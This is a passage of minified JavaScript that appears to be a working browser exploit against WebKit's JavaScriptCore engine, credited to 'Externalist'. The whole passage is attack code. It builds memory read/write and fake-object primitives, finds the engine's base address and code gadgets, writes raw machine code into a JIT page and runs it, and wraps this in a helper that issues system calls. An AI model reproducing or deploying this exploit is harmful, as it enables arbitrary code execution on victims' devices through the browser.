f=this.Uint64Ptr.cast(l.add(512));i.length>4&&1&i.length&&i.push(0);var g=l;g=function(t){return t[0]=85,t[1]=72,t[2]=137,t[3]=229,t[4]=72,t[5]=131,t[6]=228,t[7]=240,t.add(8)}(g=function(t,i){return t[0]=233,r.Int32Ptr.cast(t.add(1))[0]=i,t.add(5)}(g,4096).add(4096));for(var p=i.length-1;p>=0;p--)g=0==p?a(g,i[p]):1==p?o(g,i[p]):2==p?h(g,i[p]):3==p?d(g,i[p]):u(g=n(g,i[p]));return g=function(t){return t[0]=201,t[1]=195,t.add(2)}(g=function(t,i){return t[0]=72,t[1]=163,r.Uint64Ptr.cast(t.add(2))[0]=i,t.add(10)}(g=s(g=function(t){return t[0]=255,t[1]=208,t.add(2)}(g=n(g=s(g,-32),t)),32),f)),this.jitFunction(),f[0]},i.a=s},function(t,i,r){"use strict";var e=r(1),s=r(0);function n(){function t(){for(var t="",i="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",r=0;r<8;r++)t+=i.charAt(Math.floor(Math.random()*i.length));return t}e.a.call(this,64),this.broughtToYouBy="Externalist",this.nogc=[],this.pressure=new Array(100),this.master=new Uint32Array(4096),this.slave=new Uint32Array(4096),this.leakval_u32=new Uint32Array(4096),this.leakval_helper=[this.slave,2,3,4,5,6,7,8,9,10],this.misalign_object={a:this.u2d(2048,6300416),b:this.u2d(0,0),c:this.leakval_helper,d:this.u2d(4919,0)},this.butterfly=0,this.addr_to_slavebuf=0,this.instancespr=[];for(var i=0;i<4096;i++)this.instancespr[i]=new Uint32Array(1),this.instancespr[i][t()]=50057}n.prototype=Object.create(e.a.prototype),n.prototype.constructor=n,n.prototype.dgc=function(){for(var t=0;t<this.pressure.length;t++)this.pressure[t]=new Uint32Array(65536)},n.prototype.u2d=function(t,i){var r=new DataView(new ArrayBuffer(16));return r.setUint32(0,i),r.setUint32(4,t),r.getFloat64(0)},n.prototype.d2u=function(t){var i=new DataView(new ArrayBuffer(16));return i.setFloat64(0,t),{lo:i.getUint32(4),hi:i.getUint32(0)}},n.prototype.sleep=function(t){for(var i=(new Date).getTime();(new Date).getTime()<i+t;);},n.prototype.initWebkit=function(t){this.misalign_object.c=this.leakval_helper,this.butterfly=new s.a(t[2],t[3],!0),this.misalign_object.c=this.leakval_u32;var i=new s.a(t[4],t[5],!0);t[4]=this.butterfly.low,t[5]=this.butterfly.high,this.misalign_object.c=this.master,t[4]=this.leakval_u32[0],t[5]=this.leakval_u32[1],this.addr_to_slavebuf=new s.a(this.master[4],this.master[5],!0),this.misalign_object.c=this.leakval_u32,t[4]=i.low,t[5]=i.high,t=0,this.misalign_object.c=0;for(var r="",e=0;e<8192;e++)r+="try{} catch(e){}; ";this.fc=new Function(r);for(e=0;e<1e3;e++)this.fc();this.jitCode=this.Uint8Ptr.cast(this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(this.fc))[3])[3])[2]);for(var n=this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(parseFloat))[3])[7].and(new s.a(4095,0,!0).not());4277009103!=this.read(n,32);)n=n.sub(4096);this.javaScriptCoreBase=n;this.gadgets=this.findGadgetsCustom(this.javaScriptCoreBase,[["return",[195]]])},n.prototype.findGadgetsCustom=function(t,i){for(var r=this.Uint8Ptr.cast(t),e=new Int32Array(16384),s=r.address.add(4096),n=4096;n<65536;n+=8){var a=this.read(s,64);e[n/4]=a.low,e[n/4+1]=a.high,s.low+=8,0==(0|s.low)&&(s.high+=1)}var o=new Uint8Array(e.buffer),h={};return i.forEach(t=>{for(var i=t[0],e=t[1],s=0;;){if((s=o.indexOf(e[0],s))<0)throw"missing gadget "+i;for(var n=1;n<e.length&&!(e[n]>=0&&o[s+n]!=e[n]);n++);if(n==e.length)break;s++}h[i]=r.add(s)}),h},n.prototype.read=function(t,i){this.master[4]=t.low,this.master[5]=t.high;var r=new s.a(this.slave[0],this.slave[1],!0,i);return this.master[4]=this.addr_to_slavebuf.low,this.master[5]=this.addr_to_slavebuf.high,r},n.prototype.write=function(t,i,r){switch(this.master[4]=t.low,this.master[5]=t.high,r){case 8:this.slave[0]=(4294967040&this.slave[0])+(255&i.low);case 16:this.slave[0]=(4294901760&this.slave[0])+(65535&i.low);case 32:this.slave[0]=0|i.low;case 64:this.slave[0]=i.low,this.slave[1]=i.high}this.master[4]=this.addr_to_slavebuf.low,this.master[5]=this.addr_to_slavebuf.high},n.prototype.addressOf=function(t){this.leakval_helper[0]=t;var i=this.read(this.butterfly,64);return this.write(this.butterfly,new s.a(1094795585,4294901760,!0),64),i},n.prototype.createFakeObject=function(t){this.write(this.butterfly,t);var i=this.leakval_helper[0];return this.write(this.butterfly,new int64(1094795585,4294901760,!0)),i},n.prototype.addressOfArrayBuffer=function(t){return this.Uint64Ptr.cast(this.addressOf(t))[2]},n.prototype.addressOfSlow=function(t){},n.prototype.call=function(t,...i){var r=[],e=[];null==t.syscallNumber?e=[72,187,65,66,67,68,69,70,71,72,255,211]:((r=[72,199,192,0,0,0,0])[3]=(255&t.syscallNumber)>>0&255,r[4]=(65280&t.syscallNumber)>>8&255,r[5]=(16711680&t.syscallNumber)>>16&255,r[6]=(4278190080&t.syscallNumber)>>24&255,e=[15,5]);for(var s=new Uint8Array(r.concat([85,72,137,229,72,131,236,32,232,0,0,0,0])),n=new Uint8Array(4096),a=new Uint8Array([91,83,72,139,59,72,139,115,8,72,139,83,16,72,139,75,24,76,139,67,32,76,139,75,40].concat(e).concat([91,72,137,3,201,195])),o=0;o<s.length;o++)if(232==s[o]&&0==s[o+1]&&0==s[o+2]&&0==s[o+3]&&0==s[o+4]){this.Uint32Ptr.cast(this.addressOfArrayBuffer(s).add(o+1))[0]=4096;break}var h=this.Uint64Ptr.cast(this.addressOfArrayBuffer(n));for(o=0;o<6;o++)o<i.length&&(h[o]=i[o]);if(null==t.syscallNumber)for(o=0;o<a.length;o++)if(72==a[o]&&187==a[o+1]&&65==a[o+2]&&66==a[o+3]&&67==a[o+4]&&68==a[o+5]&&69==a[o+6]&&70==a[o+7]&&71==a[o+8]&&72==a[o+9]){this.Uint64Ptr.cast(this.addressOfArrayBuffer(a).add(o+2))[0]=t;break}var d=new Uint8Array(s.length+n.length+a.length);return d.set(s),d.set(n,s.length),d.set(a,s.length+n.length),this.writeAndCallJIT(d),this.Uint64Ptr.cast(this.Uint8Ptr.cast(this.jitCode).add(s.length))[0]},n.prototype.syscall=function(t,...i){var r=new s.a(0,0,!0);return r.syscallNumber=t+33554432,this.call(r,...i)},n.prototype.writeAndCallJIT=function(t){for(var i=0;i<t.length;i++)this.jitCode[i]=t[i];this.fc()},i.a=n}]);